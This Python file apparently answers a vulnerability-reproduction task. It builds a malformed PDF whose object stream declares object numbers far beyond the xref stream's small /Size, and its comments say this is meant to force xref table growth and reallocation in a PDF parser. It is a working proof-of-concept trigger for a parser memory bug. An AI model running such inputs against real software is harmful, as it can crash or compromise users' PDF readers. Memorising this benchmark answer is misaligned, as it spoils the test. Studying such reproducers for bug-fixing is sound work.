import os
from typing import Dict, List


class Solution:
    def solve(self, src_path: str) -> bytes:
        def add_bytes(buf: bytearray, data: bytes) -> None:
            buf.extend(data)

        def add_obj(buf: bytearray, objnum: int, body: bytes) -> int:
            off = len(buf)
            add_bytes(buf, f"{objnum} 0 obj\n".encode("ascii"))
            add_bytes(buf, body)
            if not body.endswith(b"\n"):
                add_bytes(buf, b"\n")
            add_bytes(buf, b"endobj\n")
            return off

        def add_stream_obj(buf: bytearray, objnum: int, dict_bytes: bytes, stream_data: bytes) -> int:
            off = len(buf)
            add_bytes(buf, f"{objnum} 0 obj\n".encode("ascii"))
            add_bytes(buf, dict_bytes)
            if not dict_bytes.endswith(b"\n"):
                add_bytes(buf, b"\n")
            add_bytes(buf, b"stream\n")
            add_bytes(buf, stream_data)
            if not stream_data.endswith(b"\n"):
                add_bytes(buf, b"\n")
            add_bytes(buf, b"endstream\nendobj\n")
            return off

        def pack_entry(t: int, f2: int, f3: int) -> bytes:
            return bytes((t & 0xFF,)) + int(f2).to_bytes(4, "big", signed=False) + int(f3).to_bytes(2, "big", signed=False)

        # Build PDF
        buf = bytearray()
        add_bytes(buf, b"%PDF-1.5\n%\xE2\xE3\xCF\xD3\n")

        # 1: Catalog
        off1 = add_obj(buf, 1, b"<< /Type /Catalog /Pages 2 0 R >>")

        # 2: Pages
        off2 = add_obj(buf, 2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")

        # 4: Contents stream
        contents = b"q\nQ\n"
        off4 = add_stream_obj(buf, 4, f"<< /Length {len(contents)} >>".encode("ascii"), contents)

        # 5: Object stream containing 3 0 (Page dict) and two very large object numbers to force xref growth/realloc.
        page_dict = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources <<>> >>"
        big_obj_a = b"<<>>"
        big_obj_b = b"<<>>"

        data_section = page_dict + b"\n" + big_obj_a + b"\n" + big_obj_b
        off_a = len(page_dict) + 1
        off_b = off_a + len(big_obj_a) + 1

        big1 = 200000
        big2 = 800000

        header = f"3 0 {big1} {off_a} {big2} {off_b} ".encode("ascii")
        first = len(header)
        objstm_data = header + data_section

        objstm_dict = f"<< /Type /ObjStm /N 3 /First {first} /Length {len(objstm_data)} >>".encode("ascii")
        off5 = add_stream_obj(buf, 5, objstm_dict, objstm_data)

        # 7: XRef stream
        # /Size intentionally small to allow expansion when object stream defines very large object numbers.
        xref_len = 8
        xref_data_parts: List[bytes] = []

        # obj 0: free
        xref_data_parts.append(pack_entry(0, 0, 65535))
        # obj 1: normal
        xref_data_parts.append(pack_entry(1, off1, 0))
        # obj 2: normal
        xref_data_parts.append(pack_entry(1, off2, 0))
        # obj 3: compressed in objstm 5 at index 0
        xref_data_parts.append(pack_entry(2, 5, 0))
        # obj 4: normal
        xref_data_parts.append(pack_entry(1, off4, 0))
        # obj 5: normal
        xref_data_parts.append(pack_entry(1, off5, 0))
        # obj 6: free (unused)
        xref_data_parts.append(pack_entry(0, 0, 0))
        # obj 7: placeholder for xref stream itself, will be filled after we know its offset
        xref_data_parts.append(b"")

        # Determine xref stream offset now (it will be appended next)
        xref_off = len(buf)
        xref_data_parts[7] = pack_entry(1, xref_off, 0)

        xref_data = b"".join(xref_data_parts)
        xref_dict = (
            f"<< /Type /XRef /Size {xref_len} /W [1 4 2] /Root 1 0 R /Length {len(xref_data)} >>"
        ).encode("ascii")
        add_stream_obj(buf, 7, xref_dict, xref_data)

        add_bytes(buf, f"startxref\n{xref_off}\n%%EOF\n".encode("ascii"))
        return bytes(buf)